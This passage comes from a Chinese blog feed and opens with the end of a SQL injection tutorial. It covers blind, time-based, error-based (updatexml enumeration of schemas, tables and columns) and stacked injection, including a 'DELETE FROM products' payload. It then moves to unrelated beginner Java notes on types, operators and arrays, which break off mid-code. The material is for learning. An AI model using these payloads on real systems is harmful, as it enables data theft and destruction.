class="hljs-attribute">id</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span> and length(username)&gt; num<br></code></pre></td></tr></table></figure><h3 id="SUBSTR-函数截取字符串"><a href="#SUBSTR-函数截取字符串" class="headerlink" title="SUBSTR()函数截取字符串"></a><strong><code>SUBSTR()</code>函数截取字符串</strong></h3><p><code>substr(string,start,length)</code> 参数依次为：要截取字符串，截取开始位置，截取长度。</p><p>比如注入 admin 的 password，构造这样的输入：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">username</span>=&#x27;or substr(password,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=&#x27;<span class="hljs-number">1</span>&#x27; #;<br></code></pre></td></tr></table></figure><p>实际 sql 语句：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> <span class="hljs-built_in">id</span> from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> username=<span class="hljs-string">&#x27;&#x27;</span> or substr(password,1,1)=<span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-comment">#;</span><br></code></pre></td></tr></table></figure><p>可以不断改变比较的字符，选取所有可显示字符去遍历，当猜中真正的返回值时，服务器返回用户存在。</p><p>除了截取字符串，还能替换某个字符</p><p>将<code>admin</code> 的第 4 到 6 个字符替换为 ***</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">update</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">set</span> username = <span class="hljs-built_in">substr</span>(username,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>)||<span class="hljs-string">&#x27;***&#x27;</span>||<span class="hljs-built_in">substr</span>(username,<span class="hljs-number">7</span>) <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;admin&#x27;</span>;<br></code></pre></td></tr></table></figure><p>在不使用联合注入和回显的方式拿到数据</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">substr</span>((<span class="hljs-keyword">select</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;admin&#x27;</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) = <span class="hljs-string">&#x27;a&#x27;</span>;<br></code></pre></td></tr></table></figure><h3 id="MID-函数截取字符串"><a href="#MID-函数截取字符串" class="headerlink" title="MID()函数截取字符串"></a><strong><code>MID()</code>函数截取字符串</strong></h3><p>与 <code>substr()</code>比较像</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mid</span>(<span class="hljs-string">&quot;butt3rf1y&quot;</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>);// 返回 “but”<br><span class="hljs-attribute">substr</span>(<span class="hljs-string">&quot;butt3rf1y&quot;</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>);// <span class="hljs-string">&quot;but&quot;</span><br></code></pre></td></tr></table></figure><h3 id="CONCAT-函数拼接字符串"><a href="#CONCAT-函数拼接字符串" class="headerlink" title="CONCAT()函数拼接字符串"></a><strong><code>CONCAT()</code>函数拼接字符串</strong></h3><p>可以减少查询跳转次数</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-function"><span class="hljs-title">concat</span>(<span class="hljs-params">string1,string2,...</span>)</span><br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> concat(username,<span class="hljs-string">&#x27;-&#x27;</span>,<span class="hljs-keyword">password</span>),<span class="hljs-number">1</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span>;<br></code></pre></td></tr></table></figure><p><img src="/2024/11/06/TestWP/QL14.png"></p><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>利用语句执行时间判断真假</p><h3 id="IF-函数"><a href="#IF-函数" class="headerlink" title="IF() 函数"></a><code>IF()</code> 函数</h3><p>判断指定条件是否成立，根据结果返回不同的值</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">if</span><span class="hljs-params">(condition,value_if_true,value_if_false)</span>;<br><br><span class="hljs-string">//</span> <span class="hljs-literal">true</span>:条件成立时要返回的值<br><span class="hljs-string">//</span> <span class="hljs-literal">false</span>:条件不成立时要返回的值<br></code></pre></td></tr></table></figure><h3 id="SLEEP-函数"><a href="#SLEEP-函数" class="headerlink" title="SLEEP()函数"></a><code>SLEEP()</code>函数</h3><p>程序执行时，会暂停指定秒数</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title"><span class="hljs-built_in">sleep</span></span>(<span class="hljs-variable">seconds</span>)</span><br></code></pre></td></tr></table></figure><p>比如</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> user <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">if</span>(<span class="hljs-params">sleep(<span class="hljs-number">5</span></span>),1,0)</span>;<br><br><span class="hljs-comment">//如果不存在用户名为 admin 的用户，语句将立即返回结果，否则暂停 5s 再返回结果</span><br></code></pre></td></tr></table></figure><p>延时函数 <code>SLEEP()</code> 或 <code>BENCHMARK()</code> 函数来判断是否注入成功</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(ASCII(substr(username),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">97</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">0</span>);<br><br>// 如果用户表中的第一个用户名字符为字母 a，则程序会暂停 <span class="hljs-number">5</span>s,否则返回 <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h3 id="BENCHMARK-函数"><a href="#BENCHMARK-函数" class="headerlink" title="BENCHMARK()函数"></a><code>BENCHMARK()</code>函数</h3><p>用于重复执行指定语句</p><p>（重复执行次数，重复执行语句）</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">benchmark</span><span class="hljs-params">(count,expr)</span></span><br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(benchmark(<span class="hljs-number">10</span>,md5(<span class="hljs-string">&#x27;butt3rf1y&#x27;</span>)),<span class="hljs-number">1</span>,<span class="hljs-number">0</span>);<br><br>// 如果数据库中不存在用户名为 <span class="hljs-keyword">admin</span> 的用户，那么该语句将会立即返回；否则，程序将会重复执行 md5(<span class="hljs-string">&#x27;butt3rf1y&#x27;</span>) 函数 <span class="hljs-number">10</span> 次后再返回结果<br></code></pre></td></tr></table></figure><h3 id="时间戳"><a href="#时间戳" class="headerlink" title="时间戳"></a>时间戳</h3><p><strong><code>unix_timestamp()</code> 函数</strong></p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">select</span> username,password <span class="hljs-keyword">from</span> user <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">if</span>(<span class="hljs-params">unix_timestamp</span>)&gt;1382772838,<span class="hljs-title">sleep</span>(<span class="hljs-params"><span class="hljs-number">5</span></span>),0)</span>;<br><br><span class="hljs-comment">//如果当前时间戳大于 1382772838,则程序会暂停 5s,否则返回 0</span><br></code></pre></td></tr></table></figure><h3 id="函数返回值"><a href="#函数返回值" class="headerlink" title="函数返回值"></a>函数返回值</h3><p>利用函数返回值判断是否注入成功</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(<span class="hljs-built_in">length</span>(username)=<span class="hljs-number">4</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><p>通过报错获取信息</p><h2 id="updatexml-函数"><a href="#updatexml-函数" class="headerlink" title="updatexml()函数"></a><code>updatexml()</code>函数</h2><p>用于更新 xml 格式数据</p><p>（要更新的 xml 数据，要更新的节点路径，更新的节点值）</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">updatexml</span><span class="hljs-params">(xml_target,xpath_expr,new_value)</span></span><br></code></pre></td></tr></table></figure><p>这个函数有一个缺陷，如果二个参数包含<strong>特殊符号</strong>时会报错，并且会第二 个参数的内容显示在报错信息中</p><p>比如</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,<span class="hljs-number">0x7e</span>,<span class="hljs-number">3</span>);<br><br>会报错：XPATH syntax error: <span class="hljs-string">&#x27;~&#x27;</span><br></code></pre></td></tr></table></figure><p>所以可以用 <code>concat()</code> 函数将查询语句和特殊符号拼接在一起</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,version()),<span class="hljs-number">3</span>);<br><br>// XPATH syntax error: <span class="hljs-string">&#x27;~8.0.40&#x27;</span><br></code></pre></td></tr></table></figure><p><code>updatexml()</code>有长度限制，可以用 <code>limit()</code>和<code>substr()</code> 函数</p><p><strong><code>limit()</code> 函数</strong></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>)),<span class="hljs-number">3</span>);<br><br>//可以不断改变 <span class="hljs-keyword">limit</span> num,<span class="hljs-number">1</span> 的值逐行获取<br></code></pre></td></tr></table></figure><p><img src="/2024/11/06/TestWP/QL15.png"></p><p><strong><code>substr()</code>函数</strong></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,substr((<span class="hljs-keyword">select</span> group_concat(username) <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span>),<span class="hljs-number">1</span>,<span class="hljs-number">31</span>)),<span class="hljs-number">3</span>);<br><br>// XPATH syntax error: <span class="hljs-string">&#x27;~admin,ctf,test,flag,user&#x27;</span><br></code></pre></td></tr></table></figure><p>获得所有数据库</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-string">&#x27;~&#x27;</span>,substr((<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">schema_name</span>) <span class="hljs-keyword">from</span> information_schema.schemata), <span class="hljs-number">1</span> , <span class="hljs-number">31</span>)),<span class="hljs-number">3</span>);<br><br>// XPATH syntax error: <span class="hljs-string">&#x27;~mysql,information_schema,perfor&#x27;</span><br></code></pre></td></tr></table></figure><p>获取所有表</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-string">&#x27;~&#x27;</span>,substr((<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema = <span class="hljs-string">&#x27;mysql&#x27;</span>),<span class="hljs-number">1</span>,<span class="hljs-number">31</span>)),<span class="hljs-number">3</span>);<br><br>//XPATH syntax error: <span class="hljs-string">&#x27;~columns_priv,component,db,defau&#x27;</span><br></code></pre></td></tr></table></figure><p>获取所有字段</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username, <span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-string">&#x27;~&#x27;</span>,substr((<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema = <span class="hljs-string">&#x27;mysql&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span> = <span class="hljs-string">&#x27;db&#x27;</span>),<span class="hljs-number">1</span>,<span class="hljs-number">31</span>)),<span class="hljs-number">3</span>); <br><br>// XPATH syntax error: <span class="hljs-string">&#x27;~Host,Db,User,Select_priv,Insert&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="EXTRACTVALUE-函数"><a href="#EXTRACTVALUE-函数" class="headerlink" title="EXTRACTVALUE()函数"></a><code>EXTRACTVALUE()</code>函数</h2><p>从 XML 格式的数据中提取指定节点的值</p><p>（要提取节点值的 XML 数据，要提取的节点路径）</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">extractvalue</span><span class="hljs-params">(xml_target,xpath_expr)</span></span><br></code></pre></td></tr></table></figure><p>报错和 <code>updatexml()</code> 函数一样，使用也差不多，但是少一个参数 x</p><h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><p> 一堆 SQL 语句 (多条) 一起执行方法</p><p>在执行 SQL 语句时，如果 SQL 语句中包含多个 SQL 语句，数据库服务器会依次执行这些 SQL 语句，从而导致多次 SQL 注入攻击（感觉有点小像爆破）。通过在 SQL 语句中使用分号（;）来分隔多个 SQL 语句，从而实现堆叠注入攻击。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users;<span class="hljs-keyword">show</span> databases; <br></code></pre></td></tr></table></figure><p>堆叠注入可以执行的是<strong>任意</strong>的语句。</p><p>比如用户输入：1; DELETE FROM products </p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">Select</span> * <span class="hljs-keyword">from</span> products <span class="hljs-keyword">where</span> productid=<span class="hljs-number">1</span>;<span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">FROM</span> products<br></code></pre></td></tr></table></figure><p>当执行查询后，第一条显示查询信息，第二条则将整个表进行删除</p><p>并不是每一个环境都适合堆叠注入，且在堆叠前还需要知道一些信息才能正常注入。</p><p>只是一些常见的注入类型，以后在学习过程中还会遇到新知识，到时候再补充嘻嘻~~~</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>SQL 注入</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SQL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java 基础</title>
    <link href="/2024/11/09/Java/"/>
    <url>/2024/11/09/Java/</url>
    
    <content type="html"><![CDATA[<p>一些学习 Java 的笔记，篇幅有点长嘻嘻 ^__^ ~</p><span id="more"></span><h1 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h1><h2 id="八大数据类型"><a href="#八大数据类型" class="headerlink" title="八大数据类型"></a>八大数据类型</h2><h6 id="数值型"><a href="#数值型" class="headerlink" title="数值型"></a>数值型</h6><p>​1.整数类型（byte,short,int,long）</p><p>​2.浮点类型（float,double）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">long</span> <span class="hljs-variable">num</span> <span class="hljs-operator">=</span><span class="hljs-number">30L</span>;<span class="hljs-comment">// long 型加 L</span><br><span class="hljs-type">float</span> <span class="hljs-variable">num1</span> <span class="hljs-operator">=</span> <span class="hljs-number">50.1F</span>;<span class="hljs-comment">// float 型加 F</span><br></code></pre></td></tr></table></figure><h6 id="字符型（char）2个字节"><a href="#字符型（char）2个字节" class="headerlink" title="字符型（char）2个字节"></a>字符型（char）2个字节</h6><h6 id="布尔型（boolean）"><a href="#布尔型（boolean）" class="headerlink" title="布尔型（boolean）"></a>布尔型（boolean）</h6><h2 id="引用数据类型"><a href="#引用数据类型" class="headerlink" title="引用数据类型"></a>引用数据类型</h2><p>类（class） </p><p>接口（interface）</p><p>数组（[]）</p><h1 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h1><h2 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h2><p>＋-作为单元运算符存在时，表示正负</p><p>1.＋</p><p>＋左右两边没有字符串，则进行数值运算。</p><p>＋左右两边有字符串，进行字符串拼接，如果不是字符串会<strong>转换成字符串</strong>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">System.out.println(<span class="hljs-number">100</span>+<span class="hljs-number">98</span>);<span class="hljs-comment">//198</span><br>System.out.println(<span class="hljs-string">&#x27;a&#x27;</span>+<span class="hljs-number">1</span>);<span class="hljs-comment">//98</span><br>System.out.println(<span class="hljs-string">&quot;a&quot;</span>+<span class="hljs-number">1</span>+<span class="hljs-number">3</span>);<span class="hljs-comment">//a13</span><br>System.out.println(<span class="hljs-number">1</span>+<span class="hljs-number">3</span>+<span class="hljs-string">&quot;a&quot;</span>);<span class="hljs-comment">//4a</span><br></code></pre></td></tr></table></figure><p>2.%</p><p><strong>a%b=&#x3D;a-a&#x2F;b*b</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">System.out.println(<span class="hljs-number">10</span>%<span class="hljs-number">4</span>);<span class="hljs-comment">//2</span><br>System.out.println(-<span class="hljs-number">10</span>%<span class="hljs-number">4</span>);          <span class="hljs-comment">//-2</span><br>System.out.println(<span class="hljs-number">10</span>%-<span class="hljs-number">4</span>);<span class="hljs-comment">//2</span><br>System.out.println(-<span class="hljs-number">10</span>%-<span class="hljs-number">4</span>);<span class="hljs-comment">//-2 </span><br></code></pre></td></tr></table></figure><h2 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h2><p>&amp; 和|不管真假都运算</p><p>HEX编码</p><h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><h2 id="一维数组"><a href="#一维数组" class="headerlink" title="一维数组"></a>一维数组</h2><h3 id="动态初始化"><a href="#动态初始化" class="headerlink" title="动态初始化"></a>动态初始化</h3><p>​元素类型[ ]  数组名&#x3D; new 元素类型[数组长度]；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span>[]  arr=<span class="hljs-keyword">new</span>  <span class="hljs-title class_">int</span>[<span class="hljs-number">5</span>];<br></code></pre></td></tr></table></figure><h3 id="静态初始化"><a href="#静态初始化" class="headerlink" title="静态初始化"></a>静态初始化</h3><p>元素类型[ ]  数组名&#x3D;new 元素类型[ ]{元素，元素，元素…};</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span>[]  arr=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[ ]&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>&#125;;<br><span class="hljs-type">int</span>[] arr=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>&#125;;<br></code></pre></td></tr></table></figure><p>相当于 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span>[] arr=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">5</span>];<br>arr[<span class="hljs-number">0</span>]=<span class="hljs-number">1</span>,arr[<span class="hljs-number">1</span>]=<span class="hljs-number">2</span>,arr[<span class="hljs-number">2</span>]=<span class="hljs-number">3</span>,arr[<span class="hljs-number">3</span>]=<span class="hljs-number">4</span>,arr[<span class="hljs-number">4</span>]=<span class="hljs-number">5</span>;<br></code></pre></td></tr></table></figure><p>e.g</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">char</span>[] chars=&#123;<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>&#125;;<br><span class="hljs-type">char</span> chars1[]=<span class="hljs-keyword">new</span> <span class="hljs-title class_">char</span>[]&#123;<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>&#125;;<br></code></pre></td></tr></table></figure><h3 id="数组创建后没有赋值就是默认值"><a href="#数组创建后没有赋值就是默认值" class="headerlink" title="数组创建后没有赋值就是默认值"></a>数组创建后没有赋值就是默认值</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">long</span>/<span class="hljs-type">int</span>/<span class="hljs-type">short</span>/<span class="hljs-type">byte</span> <span class="hljs-number">0</span><br><br><span class="hljs-type">float</span>/<span class="hljs-type">double</span> <span class="hljs-number">0.0</span><br><br><span class="hljs-type">boolean</span> <span class="hljs-literal">false</span><br><br>String <span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><h3 id="数组使用步骤"><a href="#数组使用步骤" class="headerlink" title="数组使用步骤"></a>数组使用步骤</h3><p>声明数组-&gt;开辟空间-&gt;给数组各个元素赋值-&gt;使用数组</p><h3 id="数组成员的赋值和读取"><a href="#数组成员的赋值和读取" class="headerlink" title="数组成员的赋值和读取"></a>数组成员的赋值和读取</h3><h3 id="下标越界会抛异常"><a href="#下标越界会抛异常" class="headerlink" title="下标越界会抛异常"></a>下标越界会抛异常</h3><p><strong>数组下标越界异常</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">int</span>[] arr=new int[<span class="hljs-number">3</span>];<br><span class="hljs-attribute">System</span>.out.println(arr[<span class="hljs-number">3</span>]);//有效下标为<span class="hljs-number">0</span>，<span class="hljs-number">1</span>，<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p><strong>空指针异常</strong></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">int[] arr<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h3 id="数组遍历"><a href="#数组遍历" class="headerlink" title="数组遍历"></a>数组遍历</h3><p><strong>数组名.length</strong>获取数组长度</p><p>数组扩容</p><h3 id="值传递与引用传递"><a href="#值传递与引用传递" class="headerlink" title="值传递与引用传递"></a>值传递与引用传递</h3><h4 id="a-栈内存"><a href="#a-栈内存" class="headerlink" title="a.栈内存"></a>a.栈内存</h4><p>​存储局部变量，离开作用域，自动释放</p><h4 id="b-堆内存"><a href="#b-堆内存" class="headerlink" title="b.堆内存"></a>b.堆内存</h4><p>​数组和对象，通过 new 建立的实例都放在堆内存中</p><p>​当没有任何引用指向实例的时候，gc 会不定时回收</p><p>​实例中的变量都有默认初始化值，建议手动初始化</p><p>​引用类型的初始化为 null</p><h4 id="c-方法区、本地方法区"><a href="#c-方法区、本地方法区" class="headerlink" title="c.方法区、本地方法区"></a>c.方法区、本地方法区</h4><h2 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a>二维数组</h2><h3 id="二维数组定义和长度"><a href="#二维数组定义和长度" class="headerlink" title="二维数组定义和长度"></a>二维数组定义和长度</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td 